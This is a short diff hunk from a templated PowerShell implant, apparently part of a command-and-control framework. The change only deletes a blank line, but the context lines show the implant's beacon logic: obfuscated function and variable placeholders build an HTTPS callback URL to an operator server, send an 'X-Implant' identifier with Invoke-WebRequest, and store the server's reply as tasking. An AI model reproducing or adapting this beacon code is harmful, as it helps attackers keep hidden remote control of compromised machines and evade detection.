@@ -170,7 +170,6 @@ function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
         $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
         $Script:headers = $r.Content
-
     } else {
         $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
         $enc = [system.Text.Encoding]::UTF8
